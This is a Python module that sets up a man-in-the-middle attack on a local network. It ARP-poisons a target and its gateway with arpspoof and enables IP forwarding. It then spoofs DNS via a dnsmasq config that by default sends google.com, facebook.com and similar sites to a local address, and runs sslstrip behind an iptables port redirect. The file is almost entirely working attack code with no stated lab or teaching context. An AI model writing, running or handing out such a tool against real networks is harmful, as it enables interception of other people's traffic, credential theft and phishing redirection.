#!/usr/bin/env python3
"""
Man-in-the-Middle Attack Module
Intercepts and modifies network traffic
"""

import subprocess
import threading
import time
from colorama import Fore, Style
import logging
import os

class MITMAttacker:
    def __init__(self, target_ip, gateway_ip=None, interface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or "10.0.0.1"
        self.interface = interface or "eth0"
        self.is_attacking = False
        self.arp_thread = None
        self.logger = logging.getLogger('mitm_attacker')
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding for MITM"""
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                         check=True, capture_output=True)
            print(f"{Fore.GREEN}[+] IP forwarding enabled{Style.RESET_ALL}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Failed to enable IP forwarding: {e}{Style.RESET_ALL}")
            return False
    
    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                         check=True, capture_output=True)
            print(f"{Fore.GREEN}[+] IP forwarding disabled{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            pass
    
    def arp_poison(self):
        """Perform ARP poisoning between target and gateway"""
        print(f"{Fore.CYAN}[*] Starting ARP poisoning...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {self.target_ip}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Gateway: {self.gateway_ip}{Style.RESET_ALL}")
        
        while self.is_attacking:
            try:
                # Poison target (tell target we are the gateway)
                subprocess.run([
                    'arpspoof', '-i', self.interface, '-t', self.target_ip, self.gateway_ip
                ], capture_output=True, timeout=2)
                
                # Poison gateway (tell gateway we are the target)  
                subprocess.run([
                    'arpspoof', '-i', self.interface, '-t', self.gateway_ip, self.target_ip
                ], capture_output=True, timeout=2)
                
                time.sleep(2)
                
            except subprocess.TimeoutExpired:
                continue
            except Exception as e:
                self.logger.error(f"ARP poisoning error: {e}")
                time.sleep(1)
    
    def start_mitm(self):
        """Start Man-in-the-Middle attack"""
        if not self.enable_ip_forwarding():
            return False
        
        print(f"{Fore.CYAN}[*] Starting MITM attack on {self.target_ip}{Style.RESET_ALL}")
        
        self.is_attacking = True
        
        # Start ARP poisoning in separate thread
        self.arp_thread = threading.Thread(target=self.arp_poison)
        self.arp_thread.daemon = True
        self.arp_thread.start()
        
        print(f"{Fore.GREEN}[+] MITM attack started{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Traffic between {self.target_ip} and gateway is now intercepted{Style.RESET_ALL}")
        
        return True
    
    def stop_mitm(self):
        """Stop MITM attack and restore ARP tables"""
        print(f"{Fore.CYAN}[*] Stopping MITM attack{Style.RESET_ALL}")
        
        self.is_attacking = False
        
        if self.arp_thread:
            self.arp_thread.join(timeout=5)
        
        # Restore ARP tables
        try:
            # Send legitimate ARP replies to restore tables
            subprocess.run([
                'arping', '-c', '3', '-I', self.interface, '-s', self.gateway_ip, self.target_ip
            ], capture_output=True)
            
            subprocess.run([
                'arping', '-c', '3', '-I', self.interface, '-s', self.target_ip, self.gateway_ip  
            ], capture_output=True)
            
        except Exception as e:
            self.logger.warning(f"Error restoring ARP tables: {e}")
        
        self.disable_ip_forwarding()
        print(f"{Fore.GREEN}[+] MITM attack stopped{Style.RESET_ALL}")
    
    def start_dns_spoofing(self, spoof_domains=None):
        """Start DNS spoofing for specific domains"""
        if not spoof_domains:
            spoof_domains = {
                'google.com': '10.0.0.1',
                'facebook.com': '10.0.0.1', 
                'youtube.com': '10.0.0.1',
                'instagram.com': '10.0.0.1',
                'twitter.com': '10.0.0.1'
            }
        
        print(f"{Fore.CYAN}[*] Starting DNS spoofing{Style.RESET_ALL}")
        
        # Create dnsmasq configuration for spoofing
        conf_content = "log-queries\n"
        for domain, ip in spoof_domains.items():
            conf_content += f"address=/{domain}/{ip}\n"
            print(f"  {domain} -> {ip}")
        
        conf_path = "/tmp/dns_spoof.conf"
        with open(conf_path, 'w') as f:
            f.write(conf_content)
        
        try:
            # Stop existing dnsmasq
            subprocess.run(['pkill', 'dnsmasq'], capture_output=True)
            
            # Start dnsmasq with spoofing config
            subprocess.Popen([
                'dnsmasq', '-C', conf_path, '-i', self.interface
            ])
            
            print(f"{Fore.GREEN}[+] DNS spoofing started{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[-] DNS spoofing failed: {e}{Style.RESET_ALL}")
    
    def start_sslstrip(self):
        """Start SSL stripping attack"""
        print(f"{Fore.CYAN}[*] Starting SSL stripping{Style.RESET_ALL}")
        
        try:
            # Setup iptables for SSL stripping
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', 
                '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '8080'
            ], check=True)
            
            # Start sslstrip
            subprocess.Popen([
                'sslstrip', '-l', '8080'
            ])
            
            print(f"{Fore.GREEN}[+] SSL stripping started{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[-] SSL stripping failed: {e}{Style.RESET_ALL}")